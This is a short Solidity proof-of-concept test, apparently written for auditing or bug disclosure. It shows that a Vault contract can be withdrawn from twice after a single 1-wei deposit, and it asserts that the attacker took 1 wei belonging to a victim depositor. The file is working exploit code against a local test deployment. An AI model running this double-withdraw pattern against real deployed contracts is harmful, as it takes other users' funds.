// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Vault} from "../src/Vault.sol";

contract Victim {
    function depositInto(Vault v) external payable { v.deposit{value: msg.value}(); }
}

/// Honest PoC: no cheatcodes. The attacker deposits 1 wei and withdraws twice,
/// taking 1 wei that belongs to the victim.
contract DoubleWithdrawPoC {
    function test_exploit_double_withdraw() public {
        Vault vault = new Vault();
        new Victim().depositInto{value: 5}(vault);

        vault.deposit{value: 1}();
        uint256 before = address(this).balance;
        vault.withdraw();
        vault.withdraw();

        require(address(this).balance - before == 2, "did not drain victim funds");
        require(address(vault).balance == 4, "vault should be short by 1 wei");
    }

    receive() external payable {}
}
